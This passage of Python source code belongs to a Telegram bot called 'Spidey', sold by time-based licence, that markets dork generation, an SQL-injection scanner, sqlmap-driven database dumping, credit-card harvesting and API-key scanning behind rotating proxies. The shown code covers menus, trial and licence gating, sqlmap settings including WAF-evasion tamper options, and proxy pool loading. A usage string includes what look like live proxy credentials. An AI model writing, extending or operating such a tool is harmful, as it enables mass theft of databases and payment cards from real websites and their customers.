         InlineKeyboardButton("🔁 Dᴇᴅᴜᴘ Sᴛᴀᴛs",          callback_data="admin_dedupstats")],
        [InlineKeyboardButton("🤖 AI Kᴇʏs Cᴏɴғɪɢ",     callback_data="admin_aikeys"),
         InlineKeyboardButton("🗂️︎ Gᴇᴛ Bᴏᴛ Fɪʟᴇ",    callback_data="admin_getfile")],
        [InlineKeyboardButton("⏪︎ Mᴀɪɴ Mᴇɴᴜ",        callback_data="menu_back")],
    ])


def make_genkey_plan_menu():
    rows = [[InlineKeyboardButton(f"{emoji} {label}", callback_data=f"genkey_{code}")]
            for label, code, emoji, _ in PLANS]
    rows.append([InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")])
    return InlineKeyboardMarkup(rows)


def make_purchase_menu():
    rows = [[InlineKeyboardButton(
                f"{emoji} {label}  —  {PLAN_PRICES.get(code, '?')}",
                callback_data=f"buy_{code}"
            )] for label, code, emoji, _ in PLANS]
    rows.append([InlineKeyboardButton("⬅️ Bᴀᴄᴋ", callback_data="menu_back")])
    return InlineKeyboardMarkup(rows)


# ── sqlmap helpers ────────────────────────────────────────────────────────────

def _get_sqlopts(uid: int) -> dict:
    """Return (or create) per-user sqlmap options."""
    if uid not in user_sqlopts:
        user_sqlopts[uid] = dict(_DEFAULT_SQLOPTS)
    return user_sqlopts[uid]


def _sqlopts_text(uid: int) -> str:
    o = _get_sqlopts(uid)
    engine_tag = "🔌 ʀᴇsᴛ ᴀᴘɪ" if o["engine"] == "api" else "⚙️ sᴜʙᴘʀᴏᴄᴇss"
    bulk_tag   = "✅ ᴏɴ" if o["bulk"] else "❌ ᴏғғ"
    return (
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        "🕷️ 𝙎𝙥𝙞𝙙𝙚𝙮 ✦ 𝙐𝙡𝙩𝙞𝙢𝙖𝙩𝙚 𝙎𝙦𝙡-𝙈𝙖𝙥\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🥇  *Lᴇᴠᴇʟ*      ➪  `{o['level']}`  _(1-5, higher=deeper)_.\n"
        f"📈  *Rɪsᴋ*       ➪  `{o['risk']}`   _(1-3, higher=heavier)_.\n"
        f"💡  *Tᴇᴄʜɴɪǫᴜᴇ*  ➪  `{o['technique']}`.\n"
        f"🔖  *Tᴀᴍᴘᴇʀ*     ➪  `{o['tamper']}`.\n"
        f"🧶  *Tʜʀᴇᴀᴅs*    ➪  `{o['threads']}`.\n"
        f"🦎  *Cʀᴀᴡʟ Dᴇᴘᴛʜ* ➪  `{o['crawl']}`  _(0=off)_.\n"
        f"🛶  *Eɴɢɪɴᴇ*     ➪  {engine_tag}.\n"
        f"🧳  *Bᴜʟᴋ Mᴏᴅᴇ*  ➪  {bulk_tag}  _(1 task, all URLs)_.\n\n"
        "_Sᴇᴛᴛɪɴɢs Bᴇʟᴏᴡ Cʜᴀɴɢᴇ Iᴛ ⬇️_"
    )


def make_sqlopts_menu(uid: int) -> InlineKeyboardMarkup:
    o = _get_sqlopts(uid)
    engine_lbl = "Sᴡɪᴛᴄʜ ➪ Sᴜʙᴘʀᴏᴄᴇss" if o["engine"] == "api" else "Sᴡɪᴛᴄʜ ➪ Rᴇsᴛ Aᴘɪ"
    bulk_lbl   = "Bulk OFF" if o["bulk"] else "Bulk ON"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🥇 Lᴇᴠᴇʟ ▲",       callback_data="sqlo_lvl_up"),
         InlineKeyboardButton("🥉 Lᴇᴠᴇʟ ▼",       callback_data="sqlo_lvl_dn")],
        [InlineKeyboardButton("📈 Rɪsᴋ ▲",        callback_data="sqlo_risk_up"),
         InlineKeyboardButton("📉 Rɪsᴋ ▼",        callback_data="sqlo_risk_dn")],
        [InlineKeyboardButton("💡 Tᴇᴄʜɴɪǫᴜᴇ: BEUSTQ",  callback_data="sqlo_tech_b"),
         InlineKeyboardButton("📛 Eʀʀᴏʀ+Uɴɪᴏɴ Oɴʟʏ",   callback_data="sqlo_tech_eu")],
        [InlineKeyboardButton("🔻 Tᴀᴍᴘᴇʀ: Sᴛᴀɴᴅᴀʀᴅ",  callback_data="sqlo_tamp_std"),
         InlineKeyboardButton("🔺 Tᴀᴍᴘᴇʀ: Mᴀx WAF",   callback_data="sqlo_tamp_max")],
        [InlineKeyboardButton(f"🧶 Tʜʀᴇᴀᴅs: {o['threads']}",  callback_data="sqlo_thr"),
         InlineKeyboardButton(f"🐊 Cʀᴀᴡʟ: {o['crawl']}",     callback_data="sqlo_crawl")],
        [InlineKeyboardButton(f"🛶 {engine_lbl}",  callback_data="sqlo_engine"),
         InlineKeyboardButton(f"🧳 {bulk_lbl}",    callback_data="sqlo_bulk")],
        [InlineKeyboardButton("🔁 Rᴇsᴇᴛ Dᴇғᴀᴜʟᴛs",  callback_data="sqlo_reset")],
        [InlineKeyboardButton("◀ Bᴀᴄᴋ Tᴏ Dᴜᴍᴘ",     callback_data="sqlo_back")],
    ])


def make_dump_start_menu() -> InlineKeyboardMarkup:
    """Keyboard shown when user enters Dorks➪DB Dump mode."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚜️ Dᴏʀᴋ ➪ Sǫʟ-Mᴀᴘ Dɪʀᴇᴄᴛ ",
                              callback_data="dump_gdork_mode")],
        [InlineKeyboardButton("⚙️ Sǫʟ-Mᴀᴘ Sᴇᴛᴛɪɴɢs",   callback_data="dump_sqlopts"),
         InlineKeyboardButton("◀ Bᴀᴄᴋ",               callback_data="menu_back")],
    ])


def make_urldump_start_menu() -> InlineKeyboardMarkup:
    """Keyboard shown when user enters URLs➪DB Dump mode."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ Sǫʟ-Mᴀᴘ Sᴇᴛᴛɪɴɢs",   callback_data="dump_sqlopts"),
         InlineKeyboardButton("◀ Bᴀᴄᴋ",               callback_data="menu_back")],
    ])


def back_button(text="⬅️ Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", data="menu_back"):
    return InlineKeyboardMarkup([[InlineKeyboardButton(text, callback_data=data)]])


def access_denied_text():
    lines = [
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        "⛔  𝘼𝙘𝙘𝙚𝙨𝙨 𝘿𝙚𝙣𝙞𝙚𝙙  ⛔\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n︎\n"
        "🕷️ Sᴘɪᴅᴇʏ ɪs ᴀ ᴜʟᴛɪᴍᴀᴛᴇ Dᴜᴍᴘᴇʀ.\n"
        "🧛🏻 Cᴏɴᴛᴀᴄᴛ Aᴅᴍɪɴ & Pᴜʀᴄʜᴀsᴇ Lɪᴄᴇɴsᴇ ᴋᴇʏ.\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n︎"
        "🏖️ Pʟᴀɴs & Pʀɪᴄɪɴɢ:\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n︎\n"
    ]
    for label, code, emoji, _ in PLANS:
        price = PLAN_PRICES.get(code, "")
        lines.append(f"  {emoji}  *{label}*  —  `{price}`")
    lines += [
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n︎"
        "Oʀ Tᴀᴘ 🔑 *Rᴇᴅᴇᴇᴍ Kᴇʏ* Iғ Yᴏᴜʜ Hᴀᴠᴇ Oɴᴇ\n"
    ]
    return "\n".join(lines)


def access_denied_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Rᴇᴅᴇᴇᴍ Kᴇʏ",        callback_data="menu_redeem"),
         InlineKeyboardButton("🏖️ Vɪᴇᴡ Pʟᴀɴs",        callback_data="menu_purchase")],
        [InlineKeyboardButton("⚙️ Bᴜʏ Sᴏᴜʀᴄᴇ Cᴏᴅᴇ",   callback_data="menu_source")],
        [InlineKeyboardButton("🆘 Cᴏɴᴛᴀᴄᴛ Aᴅᴍɪɴ",     url=f"https://t.me/{ADMIN_USERNAME.lstrip('@')}")],
    ])


def premium_locked_kb():
    """Keyboard shown when expired-trial user clicks any feature button."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏖️ Vɪᴇᴡ Pʀɪᴄᴇ Lɪsᴛ",   callback_data="menu_purchase")],
        [InlineKeyboardButton("🔑 Rᴇᴅᴇᴇᴍ Kᴇʏ",        callback_data="menu_redeem")],
        [InlineKeyboardButton("🆘 Cᴏɴᴛᴀᴄᴛ Aᴅᴍɪɴ",     url=f"https://t.me/{ADMIN_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton("⬅️ Bᴀᴄᴋ Tᴏ Mᴇɴᴜ",      callback_data="menu_back")],
    ])


def premium_locked_text():
    """Message shown when expired-trial user clicks any feature button."""
    lines = [
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        "🔒 𝙋𝙧𝙚𝙢𝙪𝙞𝙢 𝙇𝙤𝙘𝙠𝙚𝙙..!\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
        "⚠️ Yᴏᴜʀ ᴛʀɪᴀʟ ɪs ᴇxᴘɪʀᴇᴅ\n"
        "📌 Tʜɪs Fᴇᴀᴛᴜʀᴇ Rᴇǫᴜɪʀᴇs Pʀᴇᴍɪᴜᴍ Lɪᴄᴇɴsᴇ Tᴏ Pʀᴏᴄᴇᴇᴅ\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
        "🏖️ *Pʟᴀɴs & Pʀɪᴄɪɴɢ:*\n"
    ]
    for label, code, emoji, _ in PLANS:
        price = PLAN_PRICES.get(code, "")
        lines.append(f"  {emoji}  *{label}*  —  `{price}`")
    lines += [
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🆘 Cᴏɴᴛᴀᴄᴛ Aᴅᴍɪɴ: `{ADMIN_USERNAME}`\n"
        f"🎟 Cᴏᴜᴘᴏɴ Cᴏᴅᴇ: `{COUPON_CODE}`\n"
        "_Oʀ Tᴀᴘ_ 🔑 *Rᴇᴅᴇᴇᴍ Kᴇʏ* _Iғ Yᴏᴜʜ Hᴀᴠᴇ Oɴᴇ._"
    ]
    return "\n".join(lines)


def trial_expired_text():
    lines = [
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        "⏳ 𝙏𝙧𝙖𝙞𝙡 𝙀𝙭𝙥𝙞𝙧𝙚𝙙..!\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
        "⚠️ Yᴏᴜʀ Fʀᴇᴇ Tʀᴀɪʟ Hᴀs Eɴᴅᴇᴅ.\n"
        "🍷 Tᴏ Kᴇᴇᴘ Usɪɴɢ Tʜᴇ Bᴏᴛ, Pᴜʀᴄʜᴀsᴇ A Pʟᴀɴ!\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
        "🏖️ *Pʟᴀɴs & Pʀɪᴄɪɴɢ:*\n"
    ]
    for label, code, emoji, _ in PLANS:
        price = PLAN_PRICES.get(code, "")
        lines.append(f"  {emoji}  *{label}*  —  `{price}`")
    lines += [
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🆘 Cᴏɴᴛᴀᴄᴛ `{ADMIN_USERNAME}` Tᴏ Bᴜʏ\n"
        f"🎟 Usᴇ Cᴏᴜᴘᴏɴ Cᴏᴅᴇ: `{COUPON_CODE}`\n"
        "_Oʀ Usᴇ_ 🔑 *Rᴇᴅᴇᴇᴍ Kᴇʏ* _Iғ Yᴏᴜʜ Hᴀᴠᴇ Oɴᴇ_"
    ]
    return "\n".join(lines)


async def send_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    banner = random.choice(BOOT_BANNERS)
    text = (
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"{banner}"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        "»» 🕸️ Wʜᴀᴛ Cᴀɴ Sᴘɪᴅᴇʏ Dᴏ?\n\n"
        "🥇︎ *Gᴇɴ Kᴇʏᴡᴏʀᴅs*    ➪  Uᴘ Tᴏ *1,000,000* UHQ Kᴇʏᴡᴏʀᴅs.\n"
        "🥈︎ *Gᴇɴ Dᴏʀᴋs*       ➪  Uᴘ Tᴏ *1,000,000* Dᴏʀᴋs.\n"
        "🥉 *Dᴇᴇᴘ Pᴀʀsᴇʀ*    ➪  DDGS + Bɪɴɢ Dᴜᴀʟ-Eɴɢɪɴᴇ.\n"
        "🎖️ *Gᴇɴ Dᴏʀᴋs Pʀᴏ*   ➪ Gᴇɴᴇʀᴀᴛᴇ Wɪᴛʜ 10+ Pᴠᴛ Tᴇᴍᴘʟᴀᴛᴇs.\n"
        "🩻︎ *Sǫʟɪ Sᴄᴀɴɴᴇʀ*   ➪  Eʀʀᴏʀ + UNION Dᴇᴛᴇᴄᴛɪᴏɴ.\n"
        "🪜 *Dᴏʀᴋs ➪ DB Dᴜᴍᴘ*  ➪  Sǫʟᴍᴀᴘ Pᴏᴡᴇʀᴇᴅ Pɪᴘᴇʟɪɴᴇ.\n"
        "🛰️︎ *Uʀʟs ➪ DB Dᴜᴍᴘ*   ➪  Dɪʀᴇᴄᴛ URL ➪ Dᴜᴍᴘ.\n"
        "🔑 *Rᴇᴅᴇᴇᴍ Kᴇʏ*     ➪  Aᴄᴛɪᴠᴀᴛᴇ Yᴏᴜʀ Lɪᴄᴇɴsᴇ.\n"
        "🍷 *Pʀᴇᴍɪᴜᴍ*        ➪  Vɪᴇᴡ Pʟᴀɴs & Bᴜʏ Lɪᴄᴇɴsᴇ.\n\n"
        "💡 Sᴛᴀʀᴛ Fʀᴏᴍ Bᴇʟᴏᴡ "
    )
    if update.message:
        await update.message.reply_text(text, reply_markup=make_main_menu(), parse_mode=ParseMode.MARKDOWN)
    elif update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=make_main_menu(), parse_mode=ParseMode.MARKDOWN)


# ── /start ────────────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    user_id = update.effective_user.id
    first_time = user_id not in all_user_ids and user_id not in trial_users
    all_user_ids.add(user_id)

    # ── Promo / Welcome splash (shown to every user on /start) ────────────────
    promo = (
        "︎✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n"
        "🕷️ 𝙎𝙥𝙞𝙙𝙚𝙮'𝙨 𝘽𝙖𝙘𝙠𝙚𝙣𝙙 𝙒𝙤𝙧𝙠𝙛𝙡𝙤𝙬 \n"
        "︎✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        "🚂 Aᴅᴠᴀɴᴄᴇᴅ Dᴏʀᴋɪɴɢ Eɴɢɪɴᴇ.\n"
        "🩻 Sǫʟɪ Vᴜʟɴᴇʀᴀʙɪʟɪᴛʏ Sᴄᴀɴɴᴇʀ.\n"
        "🧱 DB Dᴜᴍᴘᴇʀ — Fᴜʟʟ Dᴀᴛᴀ Exᴛʀᴀᴄᴛɪᴏɴ.\n"
        "💳 CC Dᴜᴍᴘɪɴɢ — Aᴜᴛᴏ Cᴀʀᴅ Hᴀʀᴠᴇsᴛᴏʀ.\n"
        "🦨 Dᴇᴇᴘ Uʀʟ Pᴀʀsᴇʀ 8+ Sᴇᴀʀᴄʜ Eɴɢɪɴᴇs.\n"
        "💭 Cʟᴏᴜᴅ & Aᴘɪ Kᴇʏ Sᴄᴀɴɴᴇʀ.\n"
        "🥷🏻 Pʀᴏxʏ Pᴏᴏʟ Sᴜᴘᴘᴏʀᴛ + Tᴇsᴛᴇʀ Pool.\n"
        "🍷 Lɪᴄᴇɴsᴇᴅ Sʏsᴛᴇᴍ — Tɪᴍᴇ-Bᴀsᴇᴅ Pʟᴀɴs.\n"
        "🪷 Fʀᴇᴇ Tʀᴀɪʟ Fᴏʀ Nᴇᴡ Usᴇʀs.\n"
        "🐆 Fᴀsᴛᴇʀ Tʜᴀɴ Tʜᴏᴜɢʜᴛs.\n"
    )
    await update.message.reply_text(promo, parse_mode=ParseMode.MARKDOWN)

    # Register new (non-admin, non-licensed) users into trial
    if first_time and not is_admin(user_id) and user_id not in authorized_users:
        trial_users[user_id] = datetime.now()
        mins = TRIAL_MINUTES
        await update.message.reply_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "💥 𝙁𝙧𝙚𝙚 𝙏𝙧𝙖𝙞𝙡 𝙐𝙣𝙡𝙤𝙘𝙠𝙚𝙙\n"
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n︎\n"
            f"⏳ Yᴏᴜʜ Hᴀᴠᴇ *{mins} Min* Tᴏ Tʀʏ Aʟʟ Fᴇᴀᴛᴜʀᴇs!\n"
            f"🧤 Tʀʏ Eᴠᴇʀʏ Sɪɴɢʟᴇ Pᴏᴡᴇʀ.\n"
            f"⚠️ *Tʀᴀɪʟ Eɴᴅs Iɴ {mins} Mɪɴ* \n"
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            f"🍷 Bᴜʏ Pʟᴀɴ: `{ADMIN_USERNAME}`\n"
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n︎",
            parse_mode=ParseMode.MARKDOWN,
        )

    ts = trial_status(user_id)
    if not has_access(user_id):
        if ts == "expired":
            # Trial expired — still show the menu; buttons will gate on click
            await update.message.reply_text(
                "⚠️ *Yᴏᴜʀ Pʟᴀɴ Is Exᴘɪʀᴇᴅ, Cᴏɴᴛᴀᴄᴛ Aᴅᴍɪɴ!*",
                parse_mode=ParseMode.MARKDOWN,
            )
            await send_main_menu(update, context)
        else:
            await update.message.reply_text(
                access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN
            )
        return MENU

    await send_main_menu(update, context)
    return MENU


# ── ADMIN COMMANDS ─────────────────────────────────────────────────────────────

def _mask_proxy(raw: str) -> str:
    """Mask password in a proxy string for display."""
    p = raw.split(":")
    if len(p) == 4:
        return f"{p[0]}:{p[1]}:{p[2]}:****"
    return raw


def _extract_proxies_from_text(content: str) -> list:
    """
    Parse proxy lines from text content.
    Accepts:
      host:port
      host:port:user:pass
      socks5://host:port
      socks4://host:port
      http://host:port
      http://user:pass@host:port
    Returns list of formatted proxy URLs.
    """
    proxies = []
    for line in content.splitlines():
        line = line.strip().rstrip("\r")
        if not line or line.startswith("#"):
            continue
        if ":" not in line:
            continue
        # Skip Windows .ini / shortcut style lines but allow real proxy URLs
        if line.startswith("[") or (
            "=" in line
            and not line.startswith(("http://", "https://", "socks5://", "socks4://"))
        ):
            continue
        formatted = _parse_proxy(line)
        if formatted:
            proxies.append(formatted)
    return proxies


async def _setpr_from_file(
    update, context, doc, uid: int
) -> int:
    """Download a proxy file (.txt or .zip), parse all proxies, check live, add to pool."""
    import io, zipfile

    fname = doc.file_name or ""
    is_zip = fname.lower().endswith(".zip")
    is_txt = fname.lower().endswith((".txt", ".text", ".dat", ""))

    if not (is_zip or is_txt):
        await update.message.reply_text(
            "❌ Uɴsᴜᴘᴘᴏʀᴛᴇᴅ Fɪʟᴇ Tʏᴘᴇ. Pʟᴇᴀsᴇ Sᴇɴᴅ ᴀ '.txt' ᴏʀ '.ᴢɪᴘ' Fɪʟᴇ.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    # Download the file into memory
    status_msg = await update.message.reply_text(
        "︎📩 *Dᴏᴡɴʟᴏᴀᴅɪɴɢ Fɪʟᴇ...*", parse_mode=ParseMode.MARKDOWN
    )
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        buf = io.BytesIO()
        await tg_file.download_to_memory(buf)
        buf.seek(0)
        raw_bytes = buf.read()
    except Exception as e:
        await status_msg.edit_text(f"❌ Fᴀɪʟᴇᴅ Tᴏ Dᴏᴡɴʟᴏᴀᴅ Fɪʟᴇ: `{e}`", parse_mode=ParseMode.MARKDOWN)
        return MENU

    # Parse proxies from content
    all_proxies = []
    try:
        if is_zip:
            with zipfile.ZipFile(io.BytesIO(raw_bytes)) as zf:
                for name in zf.namelist():
                    if name.lower().endswith((".txt", ".text", ".dat")) and not name.startswith("__"):
                        with zf.open(name) as f:
                            content = f.read().decode("utf-8", errors="ignore")
                            all_proxies.extend(_extract_proxies_from_text(content))
        else:
            content = raw_bytes.decode("utf-8", errors="ignore")
            all_proxies.extend(_extract_proxies_from_text(content))
    except Exception as e:
        await status_msg.edit_text(f"❌ Fᴀɪʟᴇᴅ Tᴏ Rᴇᴀᴅ Fɪʟᴇ: `{e}`", parse_mode=ParseMode.MARKDOWN)
        return MENU

    if not all_proxies:
        await status_msg.edit_text(
            "❌ *Nᴏ Vᴀʟɪᴅ Pʀᴏxɪᴇs Fᴏᴜɴᴅ Iɴ Fɪʟᴇ.*\n\n"
            "Supported formats: `host:port` | `host:port:user:pass`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    # Remove duplicates and already-known proxies
    pool = user_proxies.setdefault(uid, [])
    unique = list(dict.fromkeys(p for p in all_proxies if p not in pool))
    total = len(unique)

    await status_msg.edit_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
        f"✅ 𝙁𝙞𝙡𝙚 𝙇𝙤𝙖𝙙𝙚𝙙..!\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🥷🏻 Pʀᴏxɪᴇs Fᴏᴜɴᴅ: `{len(all_proxies):,}`\n"
        f"🔄 Nᴇᴡ (Nᴏᴛ Iɴ Pᴏᴏʟ): `{total:,}`\n\n"
        f"🔍 *Cʜᴇᴄᴋɪɴɢ Aʟʟ {total:,} Pʀᴏxɪᴇs....*\n",
        parse_mode=ParseMode.MARKDOWN,
    )

    # Bulk check with live progress updates
    last_edit = [0.0]

    async def on_progress(checked: int, tot: int, live: int):
        import time
        now = time.monotonic()
        if now - last_edit[0] < 3.0:
            return
        last_edit[0] = now
        pct = int(checked / tot * 100) if tot else 0
        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
        try:
            await status_msg.edit_text(
                f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
                f"🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙋𝙧𝙤𝙭𝙞𝙚𝙨...!\n"
                f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                f"`{bar}` {pct}%\n\n"
                f"🧤 Cʜᴇᴄᴋᴇᴅ: `{checked:,}` / `{tot:,}`\n"
                f"✅ Lɪᴠᴇ: `{live:,}`\n"
                f"❌ Dᴇᴀᴅ: `{checked - live:,}`",
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            pass

    live_proxies = await check_proxies_bulk(
        unique,
        timeout=6.0,
        concurrency=300,
        progress_callback=on_progress,
    )

    # Add live proxies to pool
    pool.extend(live_proxies)
    pool_total = len(pool)
    _save_proxies()  # persist to disk

    await status_msg.edit_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
        f"✅ 𝙋𝙧𝙤𝙭𝙮 𝘼𝙙𝙙𝙚𝙙 𝙏𝙤 𝙋𝙤𝙤𝙡..!\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🧤 Cʜᴇᴄᴋᴇᴅ: `{total:,}` proxies\n"
        f"✅ Lɪᴠᴇ Aᴅᴅᴇᴅ: `{len(live_proxies):,}`\n"
        f"❌ Dᴇᴀᴅ Rᴇᴊᴇᴄᴛᴇᴅ: `{total - len(live_proxies):,}`\n"
        f"🌊 Pᴏᴏʟ Tᴏᴛᴀʟ: `{pool_total:,}` proxies\n\n"
        f"Aʟʟ `{pool_total:,}` Pʀᴏxɪᴇs Aʀᴇ Aᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ Rᴏᴛᴀᴛᴇᴅ Aᴄʀᴏss Fᴏʀ Hɪɢʜ Sᴘᴇᴇᴅ 🐎\n"
        f"_Usᴇ `/proxies` Tᴏ Lɪsᴛ | `/delpr` Tᴏ Dᴇʟᴇᴛᴇ._",
        parse_mode=ParseMode.MARKDOWN,
    )
    return MENU


async def setpr_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    /setpr host:port:user:pass  — check & add proxy to pool
    /delpr                      — clear entire proxy pool
    /proxies                    — list current proxy pool
    """
    uid = update.effective_user.id
    if not is_admin(uid) and not has_access(uid):
        await update.message.reply_text("❌ Yᴏᴜʜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪᴢᴇᴅ.")
        return MENU

    text = update.message.text.strip()
    cmd = text.split()[0].lstrip("/").lower()

    # ── /delpr — wipe the whole pool ──────────────────────────────────────
    if cmd == "delpr":
        count = len(user_proxies.get(uid, []))
        user_proxies.pop(uid, None)
        _save_proxies()
        await update.message.reply_text(
            f"🗑️ *Proxy pool cleared.*\n"
            f"Rᴇᴍᴏᴠᴇᴅ `{count}` proxies — fetching now runs direct.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    # ── /proxies — list the pool ───────────────────────────────────────────
    if cmd == "proxies":
        pool = user_proxies.get(uid, [])
        if not pool:
            await update.message.reply_text(
                "❌︎ *Nᴏ Pʀᴏxɪᴇs Aᴅᴅᴇᴅ Yᴇᴛ.*\n\n"
                "Usᴇ `/setpr host:port:user:pass` Tᴏ Aᴅᴅ Oɴᴇ.",
                parse_mode=ParseMode.MARKDOWN,
            )
            return MENU
        lines = []
        for i, px in enumerate(pool, 1):
            # Un-format back to raw for display (mask pass)
            raw = px.replace("http://", "")
            if "@" in raw:
                auth, host = raw.rsplit("@", 1)
                user_part, *pwd_parts = auth.split(":")
                lines.append(f"`{i}.` `{host}` | user:`{user_part}` pass:`****`")
            else:
                lines.append(f"`{i}.` `{raw}`")
        await update.message.reply_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            f"🥷🏻 𝙋𝙧𝙤𝙭𝙮 𝙋𝙤𝙤𝙡 — {len(pool)} 𝙋𝙧𝙤𝙭𝙞𝙚𝙨\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n" +
            "\n".join(lines) +
            "\n\n"
            "Usᴇ `/setpr ...` Tᴏ Aᴅᴅ Mᴏʀᴇ & `/delpr` Tᴏ Dᴇʟᴇᴛᴇ Aʟʟ.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    # ── /setpr — check for file (reply or direct attachment) ─────────────
    parts = text.split(maxsplit=1)
    no_arg = len(parts) < 2 or not parts[1].strip()

    # Detect document: either this message or the one being replied to
    doc = update.message.document
    if doc is None and update.message.reply_to_message:
        doc = update.message.reply_to_message.document

    if no_arg and doc:
        return await _setpr_from_file(update, context, doc, uid)

    if no_arg:
        await update.message.reply_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n" 
            "🧤︎ 𝙐𝙨𝙖𝙜𝙚\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "`/setpr ━ host:port:user:pass`\n"
            "`/setpr ━ host:port`\n\n"
            "• Exᴀᴍᴘʟᴇ:\n"
            "`/setpr ━ 108.181.3.151:31280:oovncjd637:lK2iURLNidABSnLs`\n\n"
            "• Fɪʟᴇ Uᴘʟᴏᴀᴅ:\n"
            "Rᴇᴘʟʏ ᴛᴏ ᴀ `.txt` ᴏʀ `.zip` Wɪᴛʜ `/setpr` Tᴏ Bᴜʟᴋ Aᴅᴅ Pʀᴏxɪᴇs.\n\n"
            "• Oᴛʜᴇʀ Cᴏᴍᴍᴀɴᴅs:\n"
            "`/proxies` — Lɪsᴛ Yᴏᴜʀ Pʀᴏxʏ Pᴏᴏʟ\n"
            "`/delpr` — Dᴇʟᴇᴛᴇ Aʟʟ Pʀᴏxɪᴇs",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    raw = parts[1].strip()
    formatted = _parse_proxy(raw)
    if not formatted:
        await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ Pʀᴏxʏ Fᴏʀᴍᴀᴛ.")
        return MENU

    # Check for duplicates
    pool = user_proxies.setdefault(uid, [])
    if formatted in pool:
        await update.message.reply_text(
            f"⚠️ *Pʀᴏxʏ Aʟʀᴇᴀᴅʏ Iɴ Pᴏᴏʟ:* `{_mask_proxy(raw)}`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    # Live check
    checking_msg = await update.message.reply_text(
        f"🔍 *Cʜᴇᴄᴋɪɴɢ Pʀᴏxɪᴇs...*\n`{_mask_proxy(raw)}`",
        parse_mode=ParseMode.MARKDOWN,
    )

    is_live = await check_proxy_live(formatted, timeout=5.0)

    if not is_live:
        await checking_msg.edit_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            f"❌ 𝙋𝙧𝙤𝙭𝙮 𝙁𝙤𝙪𝙣𝙙 𝘿𝙚𝙖𝙙.\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"`{_mask_proxy(raw)}`\n\n"
            "💡 Mᴀᴋᴇ Sᴜʀᴇ Tʜᴇ Pʀᴏxʏ Is Lɪᴠᴇ Aɴᴅ Rᴇᴀᴄʜᴀʙʟᴇ.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    pool.append(formatted)
    total = len(pool)
    _save_proxies()  # persist to disk

    await checking_msg.edit_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
        f"✅ 𝙋𝙧𝙤𝙭𝙮 𝙇𝙞𝙫𝙚 — 𝘼𝙙𝙙𝙚𝙙 𝙏𝙤 𝙋𝙤𝙤𝙡..!\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🥷🏻 Pʀᴏxʏ: `{_mask_proxy(raw)}`\n"
